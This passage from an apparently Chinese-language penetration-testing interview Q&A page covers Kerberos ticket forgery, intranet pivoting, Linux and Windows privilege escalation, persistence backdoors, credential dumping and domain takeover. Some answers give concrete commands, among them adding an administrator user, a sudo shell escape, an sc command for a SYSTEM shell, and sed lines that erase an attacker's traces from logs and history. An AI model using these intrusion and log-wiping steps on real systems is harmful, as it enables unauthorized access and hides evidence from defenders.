<h2 id="09-票据伪造"><a href="#09-票据伪造" class="headerlink" title="09-票据伪造"></a>09-票据伪造</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs">票据分为黄金票据和白银票据。<br>黄金票据是伪造TGT<br>伪造黄金票据必须拿到域控管理员的权限才可以。<br><br>伪造黄金票据的要求<br> 域名城<br> 域SID值<br> 域的KRBTGT账户NTLM哈希密码<br> 伪造用户名<br></code></pre></td></tr></table></figure>

<h2 id="10-拿下边界机器如何内网渗透？"><a href="#10-拿下边界机器如何内网渗透？" class="headerlink" title="10-拿下边界机器如何内网渗透？"></a>10-拿下边界机器如何内网渗透？</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs armasm">拿下机器后，使用代理访问内网 <br><span class="hljs-symbol">windows</span>环境：reGeorg与proxifier <br><span class="hljs-symbol">Linux</span>环境：reGeorg与proxychains，<br>使用nmap等工具进行扫描，发现web服务的主机和其它信息。有时这些边界机器上会记录一些内网服务器上的一些信息（用户 ssh known_hosts  hosts 防火墙设置 记录、内网之间好多waf 规则基本都是空，大多数waf防外部威胁，这时候可以拿到探测的内部一些开放的端口判断进行渗透，通常用户这里基本是统一命名的，拿到的各种记录 会暴露出部分内网通讯的<span class="hljs-built_in">ip</span>.<br></code></pre></td></tr></table></figure>

<h2 id="11-windows、Linux下操作命令"><a href="#11-windows、Linux下操作命令" class="headerlink" title="11-windows、Linux下操作命令"></a>11-windows、Linux下操作命令</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>、Regedit 查看策略表<br><span class="hljs-number">2</span>、Msconfig 查看系统配置<br><span class="hljs-number">3</span>、Taskmgr  启动任务管理器<br><span class="hljs-number">4</span>、Eventvwr,msc 打开日志的命令<br><span class="hljs-number">5</span>、Gpedit.msc  打开本地组策略<br><span class="hljs-number">6</span>、Compmgmt.msc 计算机管理<br><span class="hljs-number">7</span>、Lusrmgr.msc  打开用户与组<br><span class="hljs-number">8</span>、Taskschd  打开计划任务<br><span class="hljs-number">9</span>、Net user xxx /add 添加用户<br><span class="hljs-number">10</span>、Net localgroup administrators xxxx /add 把某用户放到管理员组里面<br><span class="hljs-number">11</span>、Net session 查询当前会话<br><span class="hljs-number">12</span>、Net start 查看当前运行的服务<br><span class="hljs-number">13</span>、Net use 查看当前共享连接<br><span class="hljs-number">15</span>、Net share xxx /del 删除共享的链接<br><span class="hljs-number">16</span>、查看隐藏用户可以去，用户管理<br><span class="hljs-number">17</span>、Findstr /s /I “hellow” ** <span class="hljs-number">18</span>查询包含hellow 的关键字<br>查看帐号文件 cat /etc/passwd<br>查看历史命令记录文件和命令 cat ~/.history<br>history   //显示终端执行过的命令<br>history <span class="hljs-number">10</span>//显示最近<span class="hljs-number">10</span>条终端执行过的命令<br>Ctrl+r     //搜索已经执行过的命令<br><br>查看网站日志<br>先进入日志文件所在目录（`/var/log`），然后使用 `tail -f `日志文件`.log` 命令进行查看（查看的命令有：`cat`（查看全部）、`tail`（查看最后多少行）、`head`（查看最开始多少）、`more`，配合`grep`使用）<br><br>查看cpu占用率<br>top`，简化版`top -bn <span class="hljs-number">1</span> -i -c<br><br>查看ssh登陆日志<br>lastlog` 会列出所有用户最近登陆的信息（引用的是`/var/log/lastlog`文件中的信息），只看`ssh`的话就`cat /var/log/lastlog<br><br>查看是否有其他ssh登陆在线<br>通过`who`命令检查当前在线用户<br>在`/var/log/secure`可以看到登陆的情况在`/var/log/btmp`中可以查看到登陆失败的记录（可通过`lastb`命令进行检查）在`/var/log/lastlog`中可以查看最近登陆的记录 （可通过`last`命令进行检查）<br><br>如果在`ssh`的配置文件里（一般在`/etc/ssh/sshd_config`）和`syslog`配置文件中对日志文件做过定制的话那么需要根据具体情况定位日志文件<br><br>查看中间件的日志<br>进入/var/log下然后进入要查看的中间件日志目录进行查看<br><br>分析命令被替换<br>对linux几个指令集进行md5sum定期验证，md5sum如果变了那说明指令变了，然后对指令集进行还原<br></code></pre></td></tr></table></figure>

<h2 id="12-linux常见的提权办法"><a href="#12-linux常见的提权办法" class="headerlink" title="12-linux常见的提权办法"></a>12-linux常见的提权办法</h2><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1.</span>uid提权 (<span class="hljs-built_in">find</span> / -perm -u=s -type f <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span>)<br><span class="hljs-number">2.</span>（sudo git help config !<span class="hljs-regexp">/bin/</span>bash或者！<span class="hljs-string">&#x27;sh&#x27;</span>完成提权）<br><span class="hljs-number">3</span>、脏牛提权<br><span class="hljs-number">4</span>、内核提权<br><span class="hljs-number">5</span>、环境劫持<br><span class="hljs-number">6</span>、suid提权<br><span class="hljs-number">7</span>、cve<span class="hljs-number">-2021</span><span class="hljs-number">-4034</span><br><span class="hljs-number">8</span>、docker提权<br></code></pre></td></tr></table></figure>

<h2 id="13-权限维持"><a href="#13-权限维持" class="headerlink" title="13-权限维持"></a>13-权限维持</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Windows机器：<br><span class="hljs-number">1</span>.替换系统文件类(shift 后门,放大镜后门)<br><span class="hljs-number">2</span>.修改注册表类<br>自启动项、屏幕保护程序注册表、用户登陆初始化、登录脚本、映像劫持、影<br>子账户、AppCertDlls 注册表项、AppInit_DLLs 注册表项、文件关联、用户<br>登陆初始化、xx<span class="hljs-selector-class">.Netsh</span> Helper DLL<br><span class="hljs-number">3</span>.文件类<br>自启动文件夹、office Word StartUp 劫持<br><span class="hljs-number">4</span>.计划任务<br>schtasks 、WMI、bitsadmin<br>Linux:<br><span class="hljs-number">1</span>.预加载型动态链接库后门<br><span class="hljs-number">2</span><span class="hljs-selector-class">.strace</span> 后门<br><span class="hljs-number">3</span><span class="hljs-selector-class">.SSH</span> 后门<br><span class="hljs-number">4</span><span class="hljs-selector-class">.SUID</span> 后门<br><span class="hljs-number">5</span><span class="hljs-selector-class">.inetd</span> 服务后门<br><span class="hljs-number">6</span>.协议后门<br><span class="hljs-number">7</span><span class="hljs-selector-class">.vim</span> 后门<br><span class="hljs-number">8</span><span class="hljs-selector-class">.PAM</span> 后门<br><span class="hljs-number">9</span>.进程注入<br><span class="hljs-number">10</span><span class="hljs-selector-class">.Rootkit</span><br><span class="hljs-number">11</span>.端口复用<br></code></pre></td></tr></table></figure>

<h2 id="14-拿到shell后如何接管域控"><a href="#14-拿到shell后如何接管域控" class="headerlink" title="14-拿到shell后如何接管域控"></a>14-拿到shell后如何接管域控</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">如果拿到的就是域内用户，定位一下域控，提取本机`hash`看域管是否登陆过本机，是否有域用户的进程之类的注入域用户进程窃取下权限，然后使用一些域内漏洞来提权到域管从而接管域控，然后通过`dcsync`权限维持或者`adminsdhound`权限维持，也可以修改机器账号的`useraccount`位 <span class="hljs-number">8192</span>权限维持<br></code></pre></td></tr></table></figure>

<h2 id="15-内网渗透搭建隧道常见的攻击？"><a href="#15-内网渗透搭建隧道常见的攻击？" class="headerlink" title="15-内网渗透搭建隧道常见的攻击？"></a>15-内网渗透搭建隧道常见的攻击？</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">frp、ew、ssh、Neo-reGeorg、netsh、Lcx<br><br><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br>网络层：Ipv6情况、icmp情况、Gre隧道<span class="hljs-number">0</span> <br>传输层：Tcp 隧道、udp 隧道 常规端口转发<br>应用层：ssh隧道、http隧道、https隧道、dns隧道<br></code></pre></td></tr></table></figure>

<h2 id="16-内网横向扩展具体方法？"><a href="#16-内网横向扩展具体方法？" class="headerlink" title="16-内网横向扩展具体方法？"></a>16-内网横向扩展具体方法？</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">密码喷洒、IPC<span class="hljs-variable">$、</span>WMI、mimikatz、PTH、MS14-<span class="hljs-number">0</span>68、web漏洞、系统漏洞<br></code></pre></td></tr></table></figure>

<h2 id="17-KDC服务默认开放哪些端口"><a href="#17-KDC服务默认开放哪些端口" class="headerlink" title="17-KDC服务默认开放哪些端口"></a>17-KDC服务默认开放哪些端口</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">88 </span>kerberos krb5、<span class="hljs-number">464</span>kerberos kpasswd（v5）<br></code></pre></td></tr></table></figure>

<h2 id="18-桌面有管理员会话，想要做会话劫持怎么做"><a href="#18-桌面有管理员会话，想要做会话劫持怎么做" class="headerlink" title="18-桌面有管理员会话，想要做会话劫持怎么做"></a>18-桌面有管理员会话，想要做会话劫持怎么做</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">提权到<span class="hljs-keyword">system</span>权限，然后去通过工具，就能够劫持任何处于已登录用户的会话，而无需获得该用户的登录凭证。<br>终端服务会话可以是连接状态也可以是未连接状态<br></code></pre></td></tr></table></figure>

<h2 id="19-域内攻击方法有了解过吗"><a href="#19-域内攻击方法有了解过吗" class="headerlink" title="19-域内攻击方法有了解过吗"></a>19-域内攻击方法有了解过吗</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MS14</span>-<span class="hljs-number">068</span>、Roasting攻击离线爆破密码、非约束性委派、基于资源的约束委派、ntlm relay、CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">42287</span>/CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">42278</span><br></code></pre></td></tr></table></figure>

<h2 id="20-抓取密码的话会怎么抓"><a href="#20-抓取密码的话会怎么抓" class="headerlink" title="20-抓取密码的话会怎么抓"></a>20-抓取密码的话会怎么抓</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">procdump+mimikatz 转储然后用mimikatz离线读取<br>Sam获取然后离线读取<br></code></pre></td></tr></table></figure>

<h2 id="21-什么版本之后抓不到密码"><a href="#21-什么版本之后抓不到密码" class="headerlink" title="21-什么版本之后抓不到密码"></a>21-什么版本之后抓不到密码</h2><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">windows server <span class="hljs-number">2012</span>之后，或者打了补丁<br><br>抓不到的话怎么办<br>翻阅文件查找运维等等是否记录密码。或者<span class="hljs-built_in">hash</span>传递、或者获取浏览器的账号密码<br></code></pre></td></tr></table></figure>

<h2 id="22-psexec和wmic的区别"><a href="#22-psexec和wmic的区别" class="headerlink" title="22-psexec和wmic的区别"></a>22-psexec和wmic的区别</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">psexec会记录大量日志，wmic不会记录日志并且更为隐蔽<br></code></pre></td></tr></table></figure>

<h2 id="23-横向渗透命令执行手段"><a href="#23-横向渗透命令执行手段" class="headerlink" title="23-横向渗透命令执行手段"></a>23-横向渗透命令执行手段</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">psexec，wmic，smbexec，winrm，<span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span>共享+计划任务+<span class="hljs-keyword">type</span>命令<br></code></pre></td></tr></table></figure>

<h2 id="24-内网的白名单-如何突破？"><a href="#24-内网的白名单-如何突破？" class="headerlink" title="24-内网的白名单 如何突破？"></a>24-内网的白名单 如何突破？</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">利用已在白名单中的软件执行目标代码，甚至发动无文件攻击<br>白名单污染<br>暴力破解白名单防护软件<br></code></pre></td></tr></table></figure>

<h2 id="25-内网135端口具体有哪些利用方式？"><a href="#25-内网135端口具体有哪些利用方式？" class="headerlink" title="25-内网135端口具体有哪些利用方式？"></a>25-内网135端口具体有哪些利用方式？</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">爆破用户、wmic执行命令进行横向<br></code></pre></td></tr></table></figure>

<h2 id="26-域控定位"><a href="#26-域控定位" class="headerlink" title="26-域控定位"></a>26-域控定位</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">cmd定位：net group <span class="hljs-string">&quot;Domain controllers&quot;</span> /Domain //查询域控<br>net time /domain//方式来定位域控，显示域控时间<br>DNS解析记录定位：nslookup -type=all _ldap._tcp.dc._msdcs.tubai.com`  //若当前主机dns为域内dns，则可以通过解析记录定位<br>端口探测定位：扫描内网中同时开放`389`、`636`与`53`的机器，`389`默认是`LDAP`协议端口，`636`端口是`LDAPS`，`53`端口默认是DNS端口，主要用于域名解析，通过DNS服务器可以实现域名与ip地址之间转换，他们都是域控机器开放的端口<br>SPN扫描定位：由于`SPN`本身就是正常的`kerberos`请求，所以扫描隐蔽，它不同于`TCP`与`UDP`常规端口扫描。大部分windows已经自带`setspn.exe`，且此操作无需管理权限<br>命令：setspn -T tubai.com -Q /<br>扫描结果中根据：`CN=AD-SERVER,OU=Domain Controllers,DC=tubai,DC=com`来进行域控的定位<br></code></pre></td></tr></table></figure>

<h2 id="27-域管定位"><a href="#27-域管定位" class="headerlink" title="27-域管定位"></a>27-域管定位</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain <span class="hljs-comment">//查询域管理员</span><br><br>此外还可以通过一些工具定位：<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PSloggedon</span>.</span></span>exe、<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PVefindaduser</span>.</span></span>exe、powerView.ps1<br></code></pre></td></tr></table></figure>

<h2 id="28-mimikatz是从哪个进程抓hash"><a href="#28-mimikatz是从哪个进程抓hash" class="headerlink" title="28-mimikatz是从哪个进程抓hash?"></a>28-mimikatz是从哪个进程抓hash?</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">lsass.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>

<h2 id="29-win2012-无法破解hash-怎么上桌面"><a href="#29-win2012-无法破解hash-怎么上桌面" class="headerlink" title="29-win2012 无法破解hash 怎么上桌面"></a>29-win2012 无法破解hash 怎么上桌面</h2><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">hash</span> pth传递<br></code></pre></td></tr></table></figure>

<h2 id="30-正向和反向shell"><a href="#30-正向和反向shell" class="headerlink" title="30-正向和反向shell"></a>30-正向和反向shell</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">正向<span class="hljs-keyword">Shell</span><span class="language-bash">：</span><br>攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况<br><br>反向<span class="hljs-keyword">Shell</span><span class="language-bash">：</span><br>被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况<br></code></pre></td></tr></table></figure>

<h2 id="31-入侵Linux服务器后需要清除哪些日志？"><a href="#31-入侵Linux服务器后需要清除哪些日志？" class="headerlink" title="31-入侵Linux服务器后需要清除哪些日志？"></a>31-入侵Linux服务器后需要清除哪些日志？</h2><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima">web日志，如 apache 的 access.<span class="hljs-built_in">log</span>,<span class="hljs-built_in">error</span>.<span class="hljs-built_in">log</span>。直接将日志清除过于明显,一般使用 sed 进行定向清除 <br>e.g. sed -i -e ‘/<span class="hljs-number">192.169</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span>/d’ <br>history 命令的清除，也是对~/.bash_history 进行定向清除 <br>wtmp日志的清除，/<span class="hljs-built_in">var</span>/<span class="hljs-built_in">log</span>/wtmp <br>登录日志清除 /<span class="hljs-built_in">var</span>/<span class="hljs-built_in">log</span>/secure <br></code></pre></td></tr></table></figure>

<h2 id="32-Windows提权的若干办法？"><a href="#32-Windows提权的若干办法？" class="headerlink" title="32.Windows提权的若干办法？"></a>32.Windows提权的若干办法？</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs vim">A.系统漏洞提权<br><span class="hljs-number">1</span>-通过 Webshell 命令行执行systeminfo 命令查看系统是否打了提权补丁，未打补丁的统可通过 github 下载系统提权漏洞 <span class="hljs-built_in">exp</span> 进行提权，KB2592799、KB3000061、KB2592799等。<br><span class="hljs-number">2</span>-通过 Webshell 找网站读写执行目录，把 <span class="hljs-keyword">cs</span> 马或提权 <span class="hljs-built_in">exp</span> 上传到对方服务器（如果cmd无法执行命令可单独上传 cmd.<span class="hljs-keyword">exe</span> 到对方服务器，菜刀终端设置为 setp <span class="hljs-keyword">c</span>:\XXX\cmd.<span class="hljs-keyword">exe</span>）<br><br>B.sc 命令提权（administrator–&gt;<span class="hljs-built_in">system</span>）<br>例如：sc Create syscmd binPath= “cmd /K start” <span class="hljs-built_in">type</span>= own <span class="hljs-built_in">type</span>= interactsc start systcmd，就得到了一个<span class="hljs-built_in">system</span>权限的cmd环境<br><br>C.不带引号的服务路径<br>当服务路径带空格的时候，路径空格目录前面一断就会当作文件执行，如 C:\ProgramFiles\MSBuild 这个目录，攻击者只要在<span class="hljs-keyword">c</span>盘创建名为 Program.<span class="hljs-keyword">exe</span> 的木马，最后只要系统重启就会执行 C:\Program.<span class="hljs-keyword">exe</span> 文件。<br><br>D.不安全的服务权限提升<br>即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，我们用木马替换服务调用的默认文件。<br><br>E.绕过系统 UAC 提升<br>可通过 msf 里面的 getsystem 绕过 UAC,也可以通过 kail 模块的<br>exploit/windows/local/bypassuac_injection、exploit/windows/local/bypassuac_vbs<br>、exploit/windows/local/ask 绕过 UAC<br></code></pre></td></tr></table></figure>

<h2 id="33-你是如何做内网渗透的？"><a href="#33-你是如何做内网渗透的？" class="headerlink" title="33-你是如何做内网渗透的？"></a>33-你是如何做内网渗透的？</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">第一种方法：在具备Webshell的情况下，通过Webshell直接上传CS木马到对方服务器运行，在CS软件上面开启 SocksProxy代理，把 kail 直接通过cs socksProxy代理攻击内网进行横向渗透。<br><br>第二种方法：通过reGeorg+Proxifie进行内网渗透，把 tunnel<span class="hljs-selector-class">.nosocket</span><span class="hljs-selector-class">.php</span> 脚本通过Webshell上传到 Web 站点目录进行访问，在本地自己电脑上面执行reGeorgSocksProxy<span class="hljs-selector-class">.py</span> <br>-<span class="hljs-selector-tag">p</span> <span class="hljs-number">9999</span> –u http:<span class="hljs-comment">//IP 地址/tunnel.nosocket.php，最后配置 Proxifier 本地代理地址与端口进行横向内网渗透。</span><br></code></pre></td></tr></table></figure>

<h2 id="34-内网横向渗透一般攻击技巧"><a href="#34-内网横向渗透一般攻击技巧" class="headerlink" title="34-内网横向渗透一般攻击技巧"></a>34-内网横向渗透一般攻击技巧</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>、通过 nmap、nessus 扫描整个内网 ip 主机漏洞，如如 ms08-<span class="hljs-number">067</span>、ms17-<span class="hljs-number">010</span>、ms12-<span class="hljs-number">020</span>、ms15-<span class="hljs-number">035</span>、ms19-<span class="hljs-number">0708</span>、永恒之蓝<span class="hljs-number">2</span>代、cve-<span class="hljs-number">2017</span>-<span class="hljs-number">7494</span>（samba）、cve-<span class="hljs-number">2014</span>-<span class="hljs-number">6271</span>(破壳)、php cgi 等相关漏洞。<br><span class="hljs-attribute">2</span>、通过 nmap 扫内网 <span class="hljs-number">80</span>、<span class="hljs-number">8080</span> 端口，看内网是否存在大量 Web 站点，如果存在进行手工或工具对 Web 站点进行漏洞检测，如注入、命令执行、反序列化、文件上传、弱口令等相关漏洞。<br><span class="hljs-attribute">3</span>、通过 ntscan、Bruter、hydra 工具对内网弱口令探测，如果发现一个服务器弱口令，可以通过这个弱口令跑整个内网，一般密码一样。<br><span class="hljs-attribute">4</span>、适当的对内网主机进行 ARP 抓取密码。<br><span class="hljs-attribute">5</span>、如果内网有 AD 域的情况下，可以通过 MS14-<span class="hljs-number">068</span> 漏洞、黄金票据、白银票据进行域控攻击，拿下域控就等于基本拿下整个内网。<br></code></pre></td></tr></table></figure>

<h2 id="35-windows-cmd如何下载文件"><a href="#35-windows-cmd如何下载文件" class="headerlink" title="35-windows cmd如何下载文件"></a>35-windows cmd如何下载文件</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span><span class="hljs-selector-class">.certutil</span><span class="hljs-selector-class">.exe</span><br><span class="hljs-number">2</span><span class="hljs-selector-class">.powershell</span><br><span class="hljs-number">3</span><span class="hljs-selector-class">.bitsadmin</span><br><span class="hljs-number">4</span><span class="hljs-selector-class">.vbs</span><br><span class="hljs-number">5</span>.ftp<br></code></pre></td></tr></table></figure>

<h2 id="36-隐藏痕迹"><a href="#36-隐藏痕迹" class="headerlink" title="36-隐藏痕迹"></a>36-隐藏痕迹</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>.跳板<br><span class="hljs-number">2</span>.代理服务器<br><span class="hljs-number">3</span><span class="hljs-selector-class">.Tor</span><br><span class="hljs-number">4</span>.日志<br><span class="hljs-number">5</span>.清除历史记录<br><span class="hljs-number">6</span>.粉碎文件<br></code></pre></td></tr></table></figure>

<h2 id="37-MySQL如何拿webshell？"><a href="#37-MySQL如何拿webshell？" class="headerlink" title="37-MySQL如何拿webshell？"></a>37-MySQL如何拿webshell？</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/1c5a169f5a0098b029c786f55e3e5488.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<h2 id="38-Hash和NTML-hash区别？"><a href="#38-Hash和NTML-hash区别？" class="headerlink" title="38-Hash和NTML hash区别？"></a>38-Hash和NTML hash区别？</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">NTLM</span> Hash（NT LAN Manager）是支持Net NTLM认证协议及本地认证过程中的一个重要参数。其长 度为<span class="hljs-number">32</span>位，由数字与字母组成。它的前身是LM Hash，目前基本淘汰，两者相差不大，只是使用的加密 算法不同。<br><br><span class="hljs-attribute">ntml</span> hash生成方式 将明文口令转换成十六进制的格式 转换成Unicode格式，即在每个字节之后添加<span class="hljs-number">0</span>x00对Unicode字符串作MD4加密，生成<span class="hljs-number">32</span>位十六进制数字串<br></code></pre></td></tr></table></figure>

<h2 id="39-内网中的信息收集技术"><a href="#39-内网中的信息收集技术" class="headerlink" title="39-内网中的信息收集技术"></a>39-内网中的信息收集技术</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">#主机信息收集 <br><span class="hljs-number">1.</span>网络配置 ipconfig /<span class="hljs-keyword">all</span> <br><span class="hljs-number">2.</span>操作系统 systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; <br><span class="hljs-number">3.</span>软件信息 systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; <br><span class="hljs-number">4.</span>服务信息 wmic /namespace:\root\securitycenter2 <span class="hljs-type">path</span> antivirusproduct <span class="hljs-keyword">GET</span> displayName,productState, pathToSignedProductExe <br><span class="hljs-number">5.</span>用户列表 net <span class="hljs-keyword">user</span> <br><span class="hljs-number">6.</span>本地管理员信息 net localgroup administrators <br><span class="hljs-number">7.</span>端口信息 netstat –ano <br><span class="hljs-number">8.</span>补丁信息 wmic qfe <span class="hljs-keyword">get</span> Caption,Description,HotFixID,InstalledOn <br><span class="hljs-number">9.</span>查防火墙 netsh firewall <span class="hljs-keyword">show</span> config <br><br><span class="hljs-meta">#2域内信息收集 </span><br>是否有域 使用ipconfig /<span class="hljs-keyword">all</span>命令可以查看网关IP地址、DNS的IP地址以及判断当前主机是否在域内：通过反 向解析查询命令nslookup来解析域名的IP地址，使用解析出来的IP地址进行对比，判断域控制器和 DNS服务器是否在同一台服务器上 <br><br>登录域信息 net config workstation<br>域内信息收集 <br>ICMP探测内网 <span class="hljs-keyword">for</span> /L %I <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) <span class="hljs-keyword">DO</span> @ping -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192.168</span><span 